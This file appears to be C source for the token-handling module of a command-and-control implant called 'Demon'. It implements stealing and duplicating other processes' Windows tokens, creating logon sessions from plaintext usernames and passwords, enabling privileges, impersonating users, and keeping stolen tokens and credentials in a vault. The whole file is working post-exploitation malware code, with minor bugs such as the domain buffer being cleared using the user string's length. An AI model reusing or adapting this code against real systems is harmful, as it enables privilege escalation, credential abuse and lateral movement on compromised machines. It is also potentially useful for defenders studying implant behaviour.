#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Token.h>
#include <Core/WinUtils.h>
#include <Core/Win32.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <ntstatus.h>

/* TODO: Change the way new tokens gets added.
 *
 * Instead of appending it to the newest token like:
 * TokenNew->Next = Token
 *
 * Add it to the first token (parent):
 *
 * Token->Next            = Instance.Tokens.Vault;
 * Instance.Tokens.Vault = Token;
 *
 * Might reduce some code which i care more than
 * token order.
 * */

BOOL TokenSetPrivilege( LPSTR Privilege, BOOL Enable )
{
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    LUID             TokenLUID       = { 0 };
    NTSTATUS         NtStatus        = STATUS_SUCCESS;
    HANDLE           hToken          = NULL;

    if ( ! Instance.Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) )
    {
        PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
        CALLBACK_GETLASTERROR
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount       = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = TokenLUID;

    if ( Enable )
        TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
    else
        TokenPrivileges.Privileges[ 0 ].Attributes = 0;

    NtStatus = Instance.Syscall.NtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken );
    if ( NT_SUCCESS( NtStatus ) )
    {
        if ( ! Instance.Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) )
        {
            PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
            return FALSE;
        }
    }
    else
    {
        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}

DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, LPSTR User, LPSTR Domain, LPSTR Password )
{
    PTOKEN_LIST_DATA TokenList   = NULL;
    PTOKEN_LIST_DATA TokenEntry  = NULL;
    DWORD            TokenIndex  = 0;

    TokenEntry              = Instance.Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
    TokenEntry->Handle      = hToken;
    TokenEntry->DomainUser  = DomainUser;
    TokenEntry->dwProcessID = dwProcessID;
    TokenEntry->Type        = Type;
    TokenEntry->lpUser      = User;
    TokenEntry->lpDomain    = Domain;
    TokenEntry->lpPassword  = Password;
    TokenEntry->NextToken   = NULL;

    if ( Instance.Tokens.Vault == NULL )
    {
        Instance.Tokens.Vault = TokenEntry;
        return TokenIndex;
    }

    TokenList = Instance.Tokens.Vault;

    // add TokenEntry to Token linked list
    do {

        if ( TokenList )
        {
            if ( TokenList->NextToken != NULL )
            {
                TokenList = TokenList->NextToken;
            }
            else
            {
                TokenList->NextToken = TokenEntry;
                break;
            }
        } else
            break;

        TokenIndex++;

    } while ( TRUE );

    return TokenIndex;
}

HANDLE TokenSteal( DWORD ProcessID )
{
    HANDLE   hProcess  = NULL;
    HANDLE   hToken    = NULL;
    HANDLE   hTokenDup = NULL;
    NTSTATUS NtStatus  = STATUS_SUCCESS;

    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
    if ( hProcess )
    {
        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
        {
            if ( ! Win32_DuplicateTokenEx(
                        hToken,
                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                        NULL,
                        SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup
                    )
                )
            {
                PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
                CALLBACK_GETLASTERROR
            }
            else PRINTF( "Successful duplicated token: %x\n", hToken )
        }
        else
        {
            PRINTF( "NtOpenProcessToken: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        }
    }
    else
    {
        PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
    }

    if ( hToken )
        Instance.Win32.NtClose( hToken );

    if ( hProcess )
        Instance.Win32.NtClose( hProcess );

    return hTokenDup;
}

BOOL TokenRemove( DWORD TokenID )
{
    PRINTF( "Token Remove => %d\n", TokenID )

    PTOKEN_LIST_DATA TokenList  = NULL;
    PTOKEN_LIST_DATA TokenItem  = NULL;

    TokenItem = TokenGet( TokenID );
    TokenList = Instance.Tokens.Vault;

    if ( ( ! TokenList ) || ( ! TokenItem ) )
        return FALSE;

    if ( Instance.Tokens.Vault == TokenItem )
    {
        PUTS( "Its first item" )
        TokenItem = Instance.Tokens.Vault->NextToken;

        if ( Instance.Tokens.Vault->Handle )
        {
            Instance.Win32.NtClose( Instance.Tokens.Vault->Handle );
            Instance.Tokens.Vault->Handle = NULL;
        }

        if ( Instance.Tokens.Vault->DomainUser )
        {
            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthA( Instance.Tokens.Vault->DomainUser ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
            Instance.Tokens.Vault->DomainUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpUser )
        {
            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthA( Instance.Tokens.Vault->lpUser ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
            Instance.Tokens.Vault->lpUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpDomain )
        {
            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthA( Instance.Tokens.Vault->lpUser ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
            Instance.Tokens.Vault->lpDomain = NULL;
        }

        if ( Instance.Tokens.Vault->lpPassword )
        {
            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthA( Instance.Tokens.Vault->lpPassword ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
            Instance.Tokens.Vault->lpPassword = NULL;
        }

        if ( Instance.Tokens.Vault )
        {
            MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault );
            Instance.Tokens.Vault = NULL;
        }

        Instance.Tokens.Vault = TokenItem;

        return TRUE;
    }

    do
    {
        if ( TokenList )
        {
            if ( TokenList->NextToken == TokenItem )
            {
                PUTS( "Found TokenItem" )

                TokenList->NextToken = TokenItem->NextToken;

                if ( TokenItem->Handle )
                {
                    Instance.Win32.NtClose( TokenItem->Handle );
                    TokenItem->Handle = NULL;
                }

                if ( TokenItem->DomainUser )
                {
                    MemSet( TokenItem->DomainUser, 0, StringLengthA( TokenItem->DomainUser ) );
                    Instance.Win32.LocalFree( TokenItem->DomainUser );
                    TokenItem->DomainUser = NULL;
                }

                if ( TokenItem->lpUser )
                {
                    MemSet( TokenItem->lpUser, 0, StringLengthA( TokenItem->lpUser ) );
                    Instance.Win32.LocalFree( TokenItem->lpUser );
                    TokenItem->lpUser = NULL;
                }

                if ( TokenItem->lpDomain )
                {
                    MemSet( TokenItem->lpDomain, 0, StringLengthA( TokenItem->lpUser ) );
                    Instance.Win32.LocalFree( TokenItem->lpDomain );
                    TokenItem->lpDomain = NULL;
                }

                if ( TokenItem->lpPassword )
                {
                    MemSet( TokenItem->lpPassword, 0, StringLengthA( TokenItem->lpPassword ) );
                    Instance.Win32.LocalFree( TokenItem->lpPassword );
                    TokenItem->lpPassword = NULL;
                }

                MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
                Instance.Win32.LocalFree( TokenItem );
                TokenItem = NULL;

                return TRUE;
            }
            else
                TokenList = TokenList->NextToken;
        }
        else
            return FALSE;
    } while ( TRUE );
}

HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
{
    HANDLE hToken = NULL;

    PRINTF( "TokenMake( %s, %s, %s )\n", User, Password, Domain )

    if ( ! Instance.Win32.RevertToSelf() )
    {
        PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        CALLBACK_GETLASTERROR
        // TODO: at this point should I return NULL or just continue ? For now i just continue.
    }

    if ( ! Instance.Win32.LogonUserA( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
    {
        PUTS( "LogonUserA: Failed" )
        CALLBACK_GETLASTERROR
    }

    return hToken;
}

HANDLE TokenCurrentHandle( )
{
    HANDLE hToken = NULL;

    // TODO: use syscalls
    if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken ) )
    {
        PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
        if ( ! Instance.Win32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) )
        {
            PRINTF( "OpenProcessToken: Failed:[%d]\n", NtGetLastError() );
            return NULL;
        }
    }

    return hToken;
}

PTOKEN_LIST_DATA TokenGet( DWORD TokenID )
{
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    do
    {
        if ( TokenList != NULL )
        {
            if ( TokenID == TokenIndex )
                break;
            else
                TokenList = TokenList->NextToken;
        } else
            break;

        TokenIndex++;
    } while ( TRUE );

    return TokenList;
}

VOID TokenClear()
{
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    do {
        if ( TokenList != NULL )
            TokenList = TokenList->NextToken;
        else
            break;
        TokenIndex++;
    } while ( TRUE );

    for ( int i = 0; i < TokenIndex; i++ )
        TokenRemove( 0 );

    Instance.Tokens.Impersonate = FALSE;
    Instance.Tokens.Vault       = NULL;
    Instance.Tokens.Token       = NULL;
}

VOID TokenImpersonate( BOOL Impersonate )
{
    if ( Impersonate && Instance.Tokens.Token )
    {
        // impersonate the current token.
        if ( Instance.Win32.ImpersonateLoggedOnUser( Instance.Tokens.Token->Handle ) )
            Instance.Tokens.Impersonate = TRUE;
        else
            Instance.Tokens.Impersonate = FALSE;
    }
    else
        Instance.Win32.RevertToSelf();
}